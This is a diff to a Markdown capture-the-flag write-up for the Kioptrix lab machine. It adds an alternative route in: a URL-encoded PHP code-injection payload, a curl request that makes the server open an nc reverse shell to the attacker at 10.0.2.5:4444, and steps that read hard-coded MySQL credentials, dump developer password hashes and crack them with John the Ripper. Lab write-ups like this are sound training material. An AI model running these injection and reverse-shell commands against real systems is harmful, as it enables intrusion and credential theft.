@@ -1,5 +1,3 @@
-https://secuniaresearch.flexerasoftware.com//secunia_research/2011-21/
-%27%29%3B%24%7Bprint%28%27test%27%29%7D%3B%23 -> ');${print('test')};#
 %27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%2010.0.2.5%204444%27%29%7D%3B%23%22 -> ');${system('nc -e /bin/sh 10.0.2.5 4444')};#"
 
 # Kioptrix 1.1 Writeup
@@ -34,6 +32,8 @@ Because we didn't have any luck with port 22, we'll move on to considering the n
 
 ![](images/front.png "http://10.0.2.7 loaded in Firefox")
 
+![](images/loginscreen.png "The login tab")
+
 Going to the "Blog" section shows two blog entries, one of which caught my eye. The "New Lead Programmer" entry gives us the username for their new lead programmer, "loneferret", which is something that we can leverage to gain access to their systems.
 
 ![](images/blog.png "Blog entries for Ligoat")
@@ -45,6 +45,59 @@ We can use THC-Hydra to try a dictionary attack on the "loneferret" user's SSH p
 Once Hydra finds a valid password, it will stop running and print out the result. In this case, it looks like the password for the "loneferret" user is "starwars". Now we can log in to the victim through the command `ssh loneferret@10.0.2.7` and entering the password when prompted.
 
 ![](images/login.png "logging in to the loneferret account")
+
+### Alternative Method
+
+I also discovered a second, more technical, method to get the password for the loneferret account. Using a tool called `OWASP ZAP`, we can scan the web application at http://10.0.2.7 for any vulnerabilities.
+
+![](images/zap.png "OWASP ZAP main screen")
+
+After running the scan, we can see that there are a few issues with the web application, most notably a PHP server side code injection in the page parameter. This means that we can get the server to run arbitrary PHP code.
+
+![](images/php.png "A server side code injection")
+
+To test this vulnerability, we put the following into the URL bar: `http://10.0.2.7/index.php?page=%27%29%3B%24%7Bprint%28%27test%27%29%7D%3B%23`, where the page parameter translates to `');${print('test')};#`. If the code injection works, we'll see the word "test" somewhere on the front page.
+
+![](images/indexphp.png "Proof of the PHP code injection")
+
+After loading the page, we can see that the word "test" is in the bottom left corner of the webpage, showing that we can properly exploit this vulnerability.
+
+To make this attack easier to carry out, I'll be using the cURL utility to make the web requests. The same proof of concept as before can be performed in cURL with the command `curl -X POST http://10.0.2.7/index.php?page=%27%29%3B%24%7Bprint%28%27test%27%29%7D%3B%23`. This will provide for use the source of the resulting web page, instead of displaying the actual web page as a browser would do, and we can see the "test" at the end of the received data.
+
+![](images/curlphp.png "Performing the code injection with cURL")
+
+Now that we know that we can execute arbitray PHP code on the web server, we can set up a shell for us to use with `nc` and a crafted web request. On the attacking machine, we'll use the command `nc -lvp 4444` so that `nc` listens on port 4444 for a connection. Then, we'll use cURL again with the command `curl -X POST http://10.0.2.7/index.php?page=%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%2010.0.2.5%204444%27%29%7D%3B%23%22`. This URL encodes the PHP code `');${system('nc -e /bin/sh 10.0.2.5 4444')};#"`, which will spawn an instance of /bin/sh with its input and output redirected to the given IP and port, essentially allowing us to have a shell.
+
+![](images/ncshell.png "Spawning a shell with nc")
+
+After the cURL command is run, we'll receive a connection on our `nc` window, and we can run the `id` command in it to see who we are running the shell as. In this case, we're acting as the www-data user. You can also run the command `python -c 'import pty; pty.spawn("/bin/bash")'`, which will set us up in a more familiar shell environment, but without proper interrupt handling or tab completion.
+
+Looking through the directory we're currently in, /home/www/kioptrix3.com/, we see an interesting directory to look at. The "gallery" directory is indicative of a Gallarific MySQL server, and if we read the contents of the configuration file with `cat gallery/gconfig.php`, we can see that there's a hardcoded MySQL username and password that we can use to connect to the MySQL server and get to the database in the config file.
+
+![](images/gconfig.png "Hard-coded credentials for the MySQL server")
+
+We can connect to the MySQL server with the command `mysql -u root -p`, which will prompt us for the password, which will be the one in the config file. After that's been entered, we are now connected to the MySQL server.
+
+![](images/mysqllogin.png "Logging in to MySQL")
+
+We know that the database that we want to connect to is called "gallery", as that's what's in the configuration file, but we can also use the `show databases;` command to list the available databases. Then, we use the `use gallery;` command, which allows us to get the information in the gallery database. This information is found in tables, and we can list the available tables with `show tables;`.
+
+![](images/tables.png "Tables in the gallery database")
+
+The table that popped out to me was the dev\_accounts table. Using the SQL statement `SELECT * FROM dev_accounts`, we can get a list of the usernames and hashed passwords for the developers.
+
+![](images/dev.png "Dev accounts available")
+
+We can take these accounts and hashes and use a utility called John the Ripper to try the hashes against a wordlist to see if any of the passwords in the wordlist, when hashed, match the found hashes. The first step is to generate a file with the usernames and hashes separated by a colon.
+
+![](images/hashes.png "Username and password hash file")
+
+Then, we use John to compare the hashes against a wordlist with the command `john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`. Hashes.txt is the file that we created, and the wordlist I chose to use is the rockyou wordlist, which comes pre-installed in Kali, but it's stored as a .gz file, so you'll need to extract it with the command `gunzip /usr/share/wordlists/rockyou.gz` first. The reason I chose the raw-md5 format is because the hashes that we found are 32 characters, which in their hexadecimal representations are 128 bits, and of hashes that produce 128 bit outputs, MD5 is the most common.
+
+![](images/john.png "Finding the corresponding passwords for the hashes")
+
+Now that we have the passwords for the loneferret and dreg usernames, we can sign in to them with the SSH method listed above.
+
 
 ## Elevating Access
 
